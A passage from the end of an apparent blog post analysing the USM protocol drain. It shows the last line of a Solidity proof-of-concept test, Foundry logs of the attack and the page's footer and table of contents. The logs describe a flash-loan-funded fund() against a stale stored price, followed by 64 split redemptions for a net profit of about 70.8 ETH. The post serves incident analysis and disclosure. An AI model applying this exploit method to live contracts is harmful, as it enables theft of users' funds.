+</span></span><span class="line"><span class="cl">        <span class="n">assertLt</span><span class="p">(</span><span class="n">ethOut</span><span class="p">,</span> <span class="n">FLASH_LOAN</span><span class="p">,</span> <span class="s">&#34;one-shot defund must be loss-making vs the 64-chunk split&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Ran 3 tests for test/USMAttackPOC.t.sol:USMAttackPOC
+</span></span><span class="line"><span class="cl">[PASS] test_01_premise_staleStoredPriceVsLiveOracle() (gas: 162090)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  stored oracleEthUsdPrice (99.2d stale): 2304031122000000000000
+</span></span><span class="line"><span class="cl">  stored ethUsdPrice (mid): 2257793612000000000000
+</span></span><span class="line"><span class="cl">  LIVE oracle.latestPrice() at ANALYSIS_HEIGHT: 1921813593298974977671
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[PASS] test_02_fullAttack_fundThen64xDefund() (gas: 5680271)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  ethPool before attack: 132588942983107019337
+</span></span><span class="line"><span class="cl">  fumOut from fund(): 62184299031602985197125048
+</span></span><span class="line"><span class="cl">  total ETH out across 64 defunds: 11650809331976090511896
+</span></span><span class="line"><span class="cl">  flash loan principal: 11579978354608392803524
+</span></span><span class="line"><span class="cl">  70830977367697708372
+</span></span><span class="line"><span class="cl">  final ethPool: 61757965615409310965
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[PASS] test_03_singleFullDefund_isLossMaking() (gas: 288756)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  single full defund ethOut: 5825405636077073924807
+</span></span><span class="line"><span class="cl">  fund principal: 11579978354608392803524</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="更新于 2026-08-12 21:16:15">更新于 2026-08-12&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" data-title="USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days" data-hashtags="attack"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" data-hashtag="attack"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" data-title="USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days"><i class="fa-brands fa-hacker-news" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" data-title="USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" data-title="USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/attack/" class="post-tag" title="标签 - Attack">Attack</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/metamask-agent-wallets-guard-mode-checks-four-things-the-approve-amount-isnt-one-of-them/" class="post-nav-item" rel="prev" title="MetaMask Agent Wallet&#39;s Guard Mode Checks Four Things. the Approve() Amount Isn&#39;t One of Them"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>MetaMask Agent Wallet&#39;s Guard Mode Checks Four Things. the Approve() Amount Isn&#39;t One of Them</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#the-protocol">The protocol</a></li>
+    <li><a href="#two-prices-and-only-one-of-them-is-fresh">Two prices, and only one of them is fresh</a></li>
+    <li><a href="#the-asymmetry-that-turns-a-refresh-into-money">The asymmetry that turns a refresh into money</a></li>
+    <li><a href="#the-attack">The attack</a></li>
+    <li><a href="#reproduction">Reproduction</a></li>
+    <li><a href="#why-the-redemption-was-split-into-64">Why the redemption was split into 64</a></li>
+    <li><a href="#why-this-is-worth-a-note-beyond-the-160k">Why this is worth a note beyond the $160k</a></li>
+    <li><a href="#poc">POC</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="目录"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/3c2b6280b581121d7ab42411f7621b0b.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
